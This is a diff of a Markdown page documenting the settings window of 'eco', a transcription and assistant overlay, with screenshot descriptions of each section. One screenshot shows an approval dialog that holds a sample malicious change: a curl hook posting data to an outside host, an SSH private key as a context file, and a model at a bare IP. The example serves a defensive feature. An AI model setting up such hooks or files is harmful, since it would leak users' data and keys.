@@ -17,7 +17,7 @@ If you are looking for a task rather than a screen, start at
 
 | what | how |
 |---|---|
-| the pictures under `img/`, `01`–`53` | `mise run shots`: writes them from the real overlay, offscreen |
+| the pictures under `img/`, `01`–`56` | `mise run shots`: writes them from the real overlay, offscreen |
 | checking they are still what the window draws | nothing does: there is no `shots:check` (see below) |
 | `img/eco.gif`, the icon | not a screen: drawn by `mise run readme:gif` from `packaging/eco.omapixel` |
 | the window on a real desktop, over a real call | no pictures: none were taken for this page |
@@ -97,10 +97,11 @@ directly; the daemon never heard them, and `eco show` on that session would not
 list them.
 
 **Also handed to the window, not done by the daemon:** the empty input list of
-`04`, the import part way through in `35` (the replay has no speech for an
-import to transcribe), and the three PipeWire devices in the menu of `39`
-(`fixtures/devices.json`: under `--replay` the daemon lists none). The import
-dialog in `34` names `~/recordings/sprint-retro.vtt` from the fixtures and is
+`04`, the import part way through in `36` (the replay has no speech for an
+import to transcribe), the three PipeWire devices in the menu of `40`
+(`fixtures/devices.json`: under `--replay` the daemon lists none), and the held
+change of `56`. The import
+dialog in `35` names `~/recordings/sprint-retro.vtt` from the fixtures and is
 closed without importing it. `02` is the last picture taken: the script stops
 the daemon first.
 
@@ -501,7 +502,7 @@ as in a live session (section 3):
 
 The dialog scrolls (arrows, `PgUp`, `PgDn`). Its end:
 
-![The keyboard shortcuts dialog scrolled to its end: the rest of PEOPLE SCREEN (F2 rename, M merge), STORED SESSION (R resume or reopen, E edit title and kind), CONVERSATION (↑ · ↓ · PgUp · PgDn, Home · End, N, Tab), QUESTION BOX (Enter, Shift+Enter, / with ↑ · ↓, Tab and Enter, Alt+1…9), MENUS AND OPTION LISTS (↑ · ↓ · Home · End, Enter · Space, Esc) and SETTINGS (Ctrl+1…8, Ctrl+S, Alt+↑ · Alt+↓, Esc).](img/38-shortcuts-end.png)
+![The keyboard shortcuts dialog scrolled to its end: STORED SESSION (R resume or reopen, E edit title and kind), CONVERSATION (↑ · ↓ · PgUp · PgDn, Home · End, N, Tab, Enter · Esc save or cancel the correction of a line), QUESTION BOX (Enter, Shift+Enter, / with ↑ · ↓, Tab and Enter, Alt+1…9), MENUS AND OPTION LISTS (↑ · ↓ · Home · End, Enter · Space, Esc) and SETTINGS (Ctrl+1…8 switch tab, Ctrl+Tab · Ctrl+Shift+Tab over two lines, next · previous tab, Enter open the item picked, Delete delete the item picked, Ctrl+E edit the item open, Ctrl+S save, Esc stop editing, back to the list, then close).](img/38-shortcuts-end.png)
 
 The GLOBAL keys are not the window's: `packaging/hypr/eco.lua` binds them in
 Hyprland to `eco window` commands, and on Windows the daemon registers them
@@ -519,97 +520,148 @@ on hover.
 The settings button in any masthead, `SUPER+ALT+C`, opens the config window: a
 second window, `eco · settings` to Hyprland, 1040×760 or its screen less a
 96-pixel margin when that is smaller, centred on the screen (the pictures are
-1040×760). It
-edits a draft. **SAVE** (`Ctrl+S`) sends the whole draft to the daemon, which
-validates and writes it; the window never writes the config itself. DISCARD
-goes back to what is saved. What keeps the draft from saving, and closing it
-unsaved, are at the end of this section.
+1040×760). The window never writes the config itself: **each item is saved on
+its own**, and the daemon validates the whole config and writes it.
 
-Eight tabs, `Ctrl+1` to `Ctrl+8`. **Each owns its own fields**; a tab that
-depends on another only reads it.
+Down the left are the eight sections, `01` to `08`, as a carousel: the one on
+screen sits at the top, beside the bar of its commands, and the others follow
+in order, the ones before it coming round after the last. Folded, the rail
+shows only the numbers; under the pointer it unfolds, each section naming
+itself. `×` at the end of the bar closes the window.
+
+A section is **a table of its items**. A click picks a row; a double click, or
+`Enter` on the picked row, opens it. The bar holds ADD (the section's own name
+for it, such as ADD MODEL), VIEW and DELETE for the picked row, and what else
+the section does. DELETE asks first, saying what changes with it, and saves at
+once; it is dimmed on an item something still needs, with the reason as its
+hint.
+
+An opened item is **read first**: under ABOUT, what it is; under RELATED, the
+items of other sections that use it or that it uses, each a link that opens
+that item in its section. BACK returns to the table, or to the item the link
+was followed from. **EDIT** turns the screen into its form. SAVE saves this
+item alone; DISCARD drops its changes and reads it again; CANCEL stops editing.
+The kicker over the title says NEW, UNSAVED, EDITING, or CHANGED ELSEWHERE when
+the saved config changed under changes that cannot be made again on it.
+Transcription, Translation and Interface are one item each: they open on that
+item, with no table, no BACK and no DELETE.
+
+| where | key | what it does |
+|---|---|---|
+| anywhere | `Ctrl+1` … `Ctrl+8` | show that section |
+| anywhere | `Ctrl+Tab`, `Ctrl+Shift+Tab` | the next, the previous section |
+| a table | `↑` `↓` | pick a row |
+| a table | `Enter` | open the picked row |
+| a table | `Delete` | delete the picked row, after asking |
+| an item | `Ctrl+E` | edit it |
+| an item, editing | `Ctrl+S` | save it |
+| anywhere | `Esc` | stop editing (changes are dropped), else go back, else close the window |
+| anywhere | `?`, `F1` | the keyboard shortcuts dialog |
 
 **Audio** — who is heard, and through what:
 
-![Settings, 01 AUDIO: AUDIO SOURCES with REFRESH; a card "Me" marked YOU with "MIC Default microphone" and ADD DEVICE; a card "Them" with THIS IS ME and "OUT Default output" and ADD DEVICE; a field "new audio source, e.g. Recruiter" with +; then YOUR MICROPHONE with DROP ECHOES lit and ECHO CANCELLATION unlit, each with what it does; CLOSE, DISCARD and SAVE at the bottom.](img/39-settings-audio.png)
+![Settings, 01 AUDIO: the bar with ADD AUDIO SOURCE, VIEW, REFRESH DEVICES and DELETE; "An audio source is a name in the conversation, heard through its devices; a device has one owner. One audio source may be you."; a table NAME · DEVICES · YOU with Me "Default microphone" YOU (picked), Them "Default output", and YOUR MICROPHONE "DROP ECHOES on · ECHO CANCELLATION off".](img/39-settings-audio.png)
 
-One card per source: its name, whether it is the user, and its PipeWire devices
-with their colour and kind. Each device also carries a live trace and is marked
-when missing; under `--replay` the daemon lists no devices, so the picture has
-neither. ADD DEVICE lists every device, and who has it now:
+A row per source: its name, its PipeWire devices and whether it is you. REFRESH
+DEVICES reads the devices again. The last row, YOUR MICROPHONE, opens the two
+switches that keep your microphone apart from the others, DROP ECHOES and ECHO
+CANCELLATION, each beside what it does; it is never deleted. Deleting a source
+says who is no longer heard. A source, edited, has its name, THIS IS ME, and
+its devices, each with its colour and, while captured, a live trace; under
+`--replay` the daemon captures nothing, so the picture has none. ADD DEVICE
+lists every device, and who has it now:
 
-![The Audio tab with the ADD DEVICE menu of "Them" open: "MIC Default microphone · Me" marked, then "MIC H390 headset microphone", "OUT H390 headset" and "MIC Built-in microphone".](img/40-settings-audio-device.png)
+![The audio source "Them" being edited, EDITING beside AUDIO SOURCE, the bar with a dimmed SAVE and CANCEL: NAME "Them"; THIS IS ME, unlit, with "This audio source is you: your lines show on the right and the model knows they are yours"; DEVICES with "OUT Default output" and a × button; the ADD DEVICE menu open: "MIC Default microphone · Me" marked, then "MIC H390 headset microphone", "OUT H390 headset" and "MIC Built-in microphone".](img/40-settings-audio-source.png)
 
-A device has one owner: picking one that another source has moves it here. Removing a
-source asks first, naming who is no longer heard.
+A device has one owner: picking one that another source has moves it here.
 
 **Models** — every model, registered once:
 
-![Settings, 02 MODELS: "Register each model once — chat or transcription — with its provider…"; four closed cards: whisper-lan (TRANSCRIPTION · whisper-large-v3-turbo · used by DEFAULT TRANSCRIPTION, MEETING, CONVERSAT…), deepgram (TRANSCRIPTION · nova-3 · used by INTERVIEW, with ×), gemini-flash (CHAT · google/gemini-2.5-flash · used by ASSISTANT, TRANSLATION, MEETING, MEETING TRANSLAT…), claude-haiku (CHAT · anthropic/claude-haiku-4.5 · used by minutes, with ×); ADD MODEL.](img/41-settings-models.png)
+![Settings, 02 MODELS: the bar with ADD MODEL, VIEW and a dimmed DELETE; "Register each model once — chat or transcription — with its provider…"; a table NAME · TYPE · MODEL ID · USED BY: whisper-lan (TRANSCRIPTION · whisper-large-v3-turbo · DEFAULT TRANSCRIPTION, MEETING, CONVERSATION…, picked), deepgram (TRANSCRIPTION · nova-3 · INTERVIEW), gemini-flash (CHAT · google/gemini-2.5-flash · ASSISTANT, TRANSLATION, MEETING, MEETING TRA…), claude-haiku (CHAT · anthropic/claude-haiku-4.5 · minutes).](img/41-settings-models.png)
 
-A closed card is its type, the provider's id and what uses it. Open, it edits
-the provider, the model, where the key comes from (an environment variable or
-an omapass password), reasoning and extra JSON for chat. Without omapass on the
-machine, as in these pictures, **OMAPASS** is off and an info button beside it
-opens omapass's install page. On Windows **CREDENTIAL MANAGER** stands in its
-place: a field for the key's name and, once one is typed, how to store that key
-with `eco key set <name>` or as the generic credential `eco:<name>`. The
-pictures are made on Linux, so none shows it:
+The assistant's model and the default transcription cannot be deleted, so
+DELETE is dimmed on them; deleting another says what falls back to which model.
+Opened, a model shows its facts, and under RELATED everything that uses it:
 
-![The gemini-flash card open: "used by ASSISTANT, TRANSLATION, MEETING, MEETING TRANSLATION, …" in full; NAME "gemini-flash"; REASONING with PROVIDER'S, OFF (lit), LOW, MEDIUM, HIGH; PROVIDER with OPENROUTER (lit), GROQ, CUSTOM; MODEL "google/gemini-2.5-flash" with LIST; KEY FROM with ENV (lit) and OMAPASS, and "OPENROUTER_API_KEY"; ADVANCED; the closed claude-haiku card below.](img/42-settings-model.png)
+![The model gemini-flash, read: the bar with BACK, EDIT and a dimmed DELETE; ABOUT with TYPE CHAT, PROVIDER OPENROUTER, BASE URL https://openrouter.ai/api/v1, MODEL ID google/gemini-2.5-flash, KEY FROM env OPENROUTER_API_KEY, REASONING OFF; RELATED with ANSWERS › ASSISTANT, TRANSLATION › TRANSLATION, and SESSIONS › MEETING, MEETING TRANSLATION, CONVERSATION, CONVERSATION TRANSLATION, OTHER, OTHER TRANSLATION, IDEA, IDEA TRANSLATION, INTERVIEW, INTERVIEW TRANSLATION.](img/42-settings-model.png)
 
- The assistant's and
-the default transcription have no ×; removing another asks first, saying what
-falls back to which model.
+Edited, it has its type while nothing uses it, its name, the reasoning for a
+chat model, the provider (CUSTOM takes any base URL), the model (LIST shows the
+models the provider offers), where the key comes from (an environment variable
+or an omapass password), the price per minute of a transcription model and,
+for a chat model, extra fields under ADVANCED. Without omapass on the machine, as in these pictures,
+**OMAPASS** is off and an info button beside it opens omapass's install page.
+On Windows **CREDENTIAL MANAGER** stands in its place: a field for the key's
+name and, once one is typed, how to store that key with `eco key set <name>` or
+as the generic credential `eco:<name>`. The pictures are made on Linux, so none
+shows it:
+
+![The model gemini-flash being edited, EDITING beside MODEL, the bar with a dimmed SAVE and CANCEL: NAME "gemini-flash"; REASONING with PROVIDER'S, OFF (lit), LOW, MEDIUM, HIGH; PROVIDER with OPENROUTER (lit), GROQ, CUSTOM; MODEL "google/gemini-2.5-flash" with LIST; KEY FROM with ENV (lit), a dimmed OMAPASS and an info button, and "OPENROUTER_API_KEY"; ADVANCED, folded.](img/43-settings-model-edit.png)
+
+Renaming a model renames it wherever it is used.
 
 **Transcription** — the default transcriber and the spoken languages:
 
-![Settings, 03 TRANSCRIPTION: MODEL with DEFAULT MODEL "whisper-lan" and "Transcribes sessions whose kind picks no transcription model"; OFFERED SPOKEN LANGUAGES as numbered rows — AUTO · detect, EN · American English, ES · español de España, PT · português — each with up and × buttons, and ADD; DEFAULT SPOKEN LANGUAGE "EN · American English".](img/43-settings-transcription.png)
+![Settings, 03, the TRANSCRIPTION item, read: the bar with EDIT only; ABOUT with DEFAULT MODEL whisper-lan, OFFERED SPOKEN LANGUAGES AUTO · detect, EN · American English, ES · español de España, PT · português, and DEFAULT SPOKEN LANGUAGE EN · American English; RELATED with MODELS › whisper-lan; under ABOUT, "Transcribes sessions whose kind picks no transcription model".](img/44-settings-transcription.png)
 
-**Answers** — the assistant, its rules, and what it is told:
+**Answers** — the assistant, its reviewer, and what they are told:
 
-![Settings, 04 ANSWERS: MODEL with DEFAULT MODEL "gemini-flash"; RULES FOR EVERY ANSWER, four lines of rules; CONTEXT with GLOBAL CONTEXT · ALWAYS SENT "~/notes/about-me.md", a "path to a text file" field with folder and + buttons, CONTEXT SLOTS with a closed "resume · 1 file" card and ADD CONTEXT SLOT, cut at the bottom.](img/44-settings-answers.png)
+![Settings, 04 ANSWERS: the bar with ADD CONTEXT SLOT and VIEW; a table NAME · MODEL · ABOUT: assistant (gemini-flash · 60000 characters · 8 answers, all sessions, picked), reviewer (claude-haiku · off), global context (1 file · always sent), resume (1 file · on in INTERVIEW).](img/45-settings-answers.png)
 
-The page scrolls: below the slots are the reviewer (on, verbose, its model and
-prompt) and the limits — context size and how many answers run at once, across
-all sessions:
+The assistant answers questions, and the skills and session kinds that pick no
+model; the reviewer, when on, rewrites every answer with its own model before
+you see it; the global context is the files sent with every answer; each
+context slot is files a session of the kinds it names starts with on. Only the
+slots are added and deleted; deleting one says which kinds lose it. Opened, the
+assistant:
 
-![The Answers tab scrolled to its end: GLOBAL CONTEXT · ALWAYS SENT and CONTEXT SLOTS; 04 REVIEWER, "A second model rewrites every answer before you see it…", with a "Review answers" switch off; 05 LIMITS with MAXIMUM CONTEXT (CHARACTERS) 60000 and ANSWERS RUNNING AT THE SAME TIME, ALL SESSIONS 8.](img/45-settings-answers-end.png)
+![The assistant, read: the bar with BACK and EDIT; ABOUT with DEFAULT MODEL gemini-flash, CONTEXT LIMIT 60000 characters, AT THE SAME TIME 8 answers, all sessions; under it "Answers questions, and skills and session kinds that pick no model" and RULES FOR EVERY ANSWER, four lines of rules; RELATED with MODELS › gemini-flash, SKILLS › reply, explain, and SESSIONS › MEETING, CONVERSATION, OTHER, IDEA, INTERVIEW.](img/46-settings-assistant.png)
 
 **Skills** — what the composer's chips do:
 
-![Settings, 05 SKILLS: three cards — reply "default · gemini-flash · HOOK · ON SEND", minutes "claude-haiku", explain "default · gemini-flash" — each with up, down and × buttons; ADD SKILL.](img/46-settings-skills.png)
+![Settings, 05 SKILLS: the bar with ADD SKILL, VIEW, a dimmed MOVE UP, MOVE DOWN and DELETE; a table NAME · MODEL · HOOK: reply (default · gemini-flash · HOOK · ON SEND, picked), minutes (claude-haiku), explain (default · gemini-flash).](img/47-settings-skills.png)
 
-The order here is the order of the chips and of `Alt+1…9`. A skill with no
-model of its own names the one it inherits. Open, a card edits the name, the
-prompt, the format, the model and its hook:
+The order here is the order of the chips and of `Alt+1…9`; MOVE UP and MOVE
+DOWN change it and save at once. A skill with no model of its own names the one
+it inherits:
 
-![The reply card open: NAME "reply"; PROMPT and OUTPUT FORMAT as text areas; MODEL "default · gemini-flash"; HOOK "~/bin/post-to-notes" with what the command is run with; SEND ON ITS OWN, off.](img/47-settings-skill.png)
+![The skill reply, read: the bar with BACK, EDIT and DELETE; ABOUT with MODEL default · gemini-flash, HOOK ~/bin/post-to-notes, SEND ON ITS OWN off; PROMPT and OUTPUT FORMAT in full below; RELATED with MODELS › gemini-flash.](img/48-settings-skill.png)
 
-Renaming or removing one warns that global shortcuts call skills by name.
+Edited, it has the name, the prompt, the format, the model and its hook:
+
+![The skill reply being edited, EDITING beside SKILL, the bar with a dimmed SAVE and CANCEL: NAME "reply"; PROMPT and OUTPUT FORMAT as text areas; MODEL "default · gemini-flash"; HOOK "~/bin/post-to-notes" and what the command is run with; SEND ON ITS OWN, unlit.](img/49-settings-skill-edit.png)
+
+A new name warns that global shortcuts call skills by name.
 
 **Translation** — only the model:
 
-![Settings, 06 TRANSLATION: a sentence saying a session translates only once it is turned on in that session, on the TRANSLATION line of its details, and that here you pick the model; DEFAULT MODEL "gemini-flash"; "Translates sessions whose kind picks no translation model; on the default, the assistant's model does".](img/48-settings-translation.png)
+![Settings, 06, the TRANSLATION item, read: the bar with EDIT only; ABOUT with DEFAULT MODEL gemini-flash; a sentence saying a session translates its lines and answers only once it is turned on in that session, on the TRANSLATION line of its details, and that here you pick the model; "Translates sessions whose kind picks no translation model; on the default, the assistant's model does"; RELATED with MODELS › gemini-flash.](img/50-settings-translation.png)
 
 **Until a chat model is registered**, ANSWERS, SKILLS and TRANSLATION hold only
-`01 NO CHAT MODEL`, "eco records and transcribes without one. Answers, skills
-and translation need a chat model: register one under Models, then pick it
-here.", and REGISTER A CHAT MODEL, which opens Models. It is not pictured: the
-pictures run with chat models registered.
+NO CHAT MODEL and "eco records and transcribes without one. Answers, skills and
+translation need a chat model: register one under Models, then pick it here.",
+and their bar holds only REGISTER A CHAT MODEL, which opens a new model under
+Models. It is not pictured: the pictures run with chat models registered.
 
 **Sessions** — the kinds, and what each runs on:
 
-![Settings, 07 SESSIONS: a sentence on the default kind and the kinds' own models; five cards — Meeting "DEFAULT · transcribes with whisper-lan · answers with gemini-flash", Conversation, Other and Idea with the same models, interview "transcribes with deepgram · answers with gemini-flash" — each with ×; ADD KIND.](img/49-settings-sessions.png)
+![Settings, 07 SESSIONS: the bar with ADD KIND, VIEW, a dimmed MAKE DEFAULT and DELETE; a sentence on the default kind and the kinds' own models; a table NAME · DEFAULT · TRANSCRIBES WITH · ANSWERS WITH: Meeting (DEFAULT · default · whisper-lan · default · gemini-flash, picked), Conversation, Other and Idea with the same defaults, interview (deepgram · default · gemini-flash).](img/51-settings-sessions.png)
 
-The first kind is the default the start and import dialogs suggest. Open, a
-card renames the kind, makes it the default, and gives it its own
-transcription, assistant and translation models — only the transcription one
-until a chat model is registered. Removing one says its sessions keep it.
+The default kind is the one the start and import dialogs suggest; MAKE DEFAULT
+makes the picked kind it. Deleting a kind says its sessions keep it and the
+models and context slots chosen for it stop applying; the only kind left
+cannot be deleted. Opened:
+
+![The session kind Meeting, read: the bar with BACK, EDIT, a dimmed MAKE DEFAULT and DELETE; ABOUT with DEFAULT "The default: suggested first", TRANSCRIPTION default · whisper-lan, ASSISTANT default · gemini-flash, TRANSLATION default · gemini-flash; RELATED with MODELS › whisper-lan, gemini-flash.](img/52-settings-kind.png)
+
+Edited, a kind has its name and its own transcription, assistant and
+translation models — only the transcription one until a chat model is
+registered.
 
 **Interface** — the interface language, whether eco hides from screen
 sharing, and whether it shows in the tray:
 
-![Settings, 08 INTERFACE: INTERFACE LANGUAGE "English (US)"; below it the unlit chip HIDE FROM SCREEN SHARING and its help: "eco's windows are hidden from whoever watches your shared screen, and from your own screenshots and recordings too: the system cannot tell them apart"; below that the unlit chip SHOW ECO IN THE TRAY and its help.](img/50-settings-interface.png)
+![Settings, 08, the INTERFACE item, read: the bar with EDIT only; ABOUT with INTERFACE LANGUAGE English (US), HIDE FROM SCREEN SHARING off, SHOW ECO IN THE TRAY off; RELATED "Nothing else in the settings uses it."](img/53-settings-interface.png)
 
 English, Brazilian Portuguese or Japanese, or `auto` to follow the system;
 see [i18n.md](i18n.md). HIDE FROM SCREEN SHARING is off by default; on, it
@@ -627,22 +679,25 @@ dialog), **Settings** (opens or closes them, as `eco window config`) and
 **Stop eco** (as `eco stop`: the windows and the icon go with the daemon). On
 Omarchy the bar may keep tray icons in a drawer behind its `<` arrow.
 
-**What keeps the draft from saving** shows on its own field: an outline in the
-error colour and the reason under it, and a dot on the tab that holds it. A
-repeated name or a space in a skill's name shows as it is typed; a missing value
-once a save is tried. No model is required: before any is registered, the
-draft saves with no default transcription or assistant model, and sessions say
-none is chosen until one is; a default that names a model names a registered
-one. The line above the buttons only counts them:
+**What keeps an item from saving** shows on its own field: an outline in the
+error colour and the reason under it, and the keyboard goes to the first such
+field. A value typed wrong shows as it is typed; a missing value once a save is
+tried. Anything that is not one field's shows under the title. Here, ADD MODEL
+and then SAVE with nothing filled:
 
-![The Skills tab with a dot after "05 SKILLS"; the minutes card open and renamed "weekly minutes", its NAME field outlined in red with "No spaces: shortcuts call a skill by its name." under it, and in amber the warning that global shortcuts call a skill by its name; above CLOSE, in amber, "1 field needs fixing before saving."](img/51-settings-errors.png)
+![A new model being edited, NEW and EDITING beside MODEL, the bar with SAVE and CANCEL: TYPE with CHAT lit; NAME empty, showing "new model", outlined in red with "Give it a name." under it; REASONING, PROVIDER with OPENROUTER lit; MODEL empty, showing "e.g. google/gemini-3.5-flash-lite", outlined in red with "Set the provider's model id." under it; KEY FROM with ENV lit and "OPENROUTER_API_KEY".](img/54-settings-errors.png)
 
-**Closing with unsaved changes** asks:
+No model is required: before any is registered, the config saves with no
+default transcription or assistant model, and sessions say none is chosen
+until one is; a default that names a model names a registered one.
 
-![The UNSAVED CHANGES dialog over the dimmed settings: "Your settings have unsaved changes. Save them before closing?" with SAVE AND CLOSE, KEEP EDITING and, filled red, DISCARD CHANGES.](img/52-settings-unsaved.png)
+**Closing with an item unsaved** asks:
 
-Closing the eco window itself closes the settings with it and does not ask:
-unsaved changes there are dropped.
+![The UNSAVED CHANGES dialog over the dimmed new model, a dot on the rail's 02 for the item not saved: "Your settings have unsaved changes. Save them before closing?" with SAVE AND CLOSE, KEEP EDITING and, filled red, DISCARD CHANGES.](img/55-settings-unsaved.png)
+
+SAVE AND CLOSE saves the item and closes once it is saved; it stays open when
+another item still has changes. Closing the eco window itself closes the
+settings with it and does not ask: unsaved changes there are dropped.
 
 **A change another program asked for.** Only this window's own SAVE writes at
 once a new or changed skill hook, a new context file, or a new model or a
@@ -651,7 +706,7 @@ config that does (an agent, a script), the daemon holds it and every eco window
 asks, naming each hook command, each file path, and each model's address and
 where its key comes from (never the key):
 
-![The APPROVE THIS CHANGE dialog over a dimmed live session: "A program other than this window asked to change the settings. Approving saves it: a hook runs as a shell command after answers, a context file is sent to the model, and a model's key is sent to its address."; in red, "hook of minutes: curl -s --data-binary @- https://example.com/collect", "context file: ~/.ssh/id_ed25519" and "model fast: http://203.0.113.7/v1, key from $OPENROUTER_API_KEY"; REJECT and, filled red, APPROVE.](img/53-settings-pending.png)
+![The APPROVE THIS CHANGE dialog over a dimmed live session: "A program other than this window asked to change the settings. Approving saves it: a hook runs as a shell command after answers, a context file is sent to the model, and a model's key is sent to its address."; in red, "hook of minutes: curl -s --data-binary @- https://example.com/collect", "context file: ~/.ssh/id_ed25519" and "model fast: http://203.0.113.7/v1, key from $OPENROUTER_API_KEY"; REJECT and, filled red, APPROVE.](img/56-settings-pending.png)
 
 **APPROVE** saves the change; **REJECT** drops it, and the status line says it
 was rejected. Esc and a press outside do not close it. The keyboard starts on
